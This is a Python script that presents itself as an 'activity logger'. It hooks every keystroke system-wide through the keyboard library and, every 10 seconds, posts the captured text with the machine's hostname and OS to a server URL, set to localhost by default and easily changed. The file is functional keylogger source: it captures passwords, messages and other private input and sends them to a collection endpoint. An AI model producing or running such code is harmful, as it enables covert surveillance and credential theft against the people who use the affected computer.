import keyboard
import requests
from threading import Timer
from datetime import datetime
import platform

# Configuration
SEND_REPORT_EVERY = 10  # Send logs every 10 seconds
SERVER_URL = "http://localhost:5000/api/logs"

class ActivityLogger:
    def __init__(self, interval, server_url):
        self.interval = interval
        self.server_url = server_url
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        
    def callback(self, event):
        """Captures keyboard events"""
        name = event.name
        
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"
        
        self.log += name
    
    def send_to_server(self, log_data):
        """Send logs to localhost server"""
        try:
            payload = {
                "timestamp": datetime.now().isoformat(),
                "start_time": self.start_dt.isoformat(),
                "end_time": self.end_dt.isoformat(),
                "log_data": log_data,
                "machine_id": f"{platform.node()}_{platform.system()}"
            }
            
            response = requests.post(
                self.server_url,
                json=payload,
                timeout=5
            )
            
            if response.status_code == 200:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] ✓ Logs sent successfully")
            else:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] ✗ Failed: {response.status_code}")
                
        except requests.exceptions.ConnectionError:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] ✗ Cannot connect to server")
        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] ✗ Error: {str(e)}")
    
    def report(self):
        """Periodically send logs to server"""
        if self.log:
            self.end_dt = datetime.now()
            self.send_to_server(self.log)
            self.start_dt = datetime.now()
            self.log = ""
        
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    
    def start(self):
        """Start the activity logger"""
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        
        print(f"{'='*60}")
        print(f"Activity Logger Started (Windows)")
        print(f"Server: {self.server_url}")
        print(f"Interval: {self.interval} seconds")
        print(f"{'='*60}")
        print("Press CTRL+C to stop\n")
        
        keyboard.wait()

if __name__ == "__main__":
    try:
        logger = ActivityLogger(
            interval=SEND_REPORT_EVERY,
            server_url=SERVER_URL
        )
        logger.start()
    except KeyboardInterrupt:
        print(f"\n[{datetime.now().strftime('%H:%M:%S')}] Logger stopped")
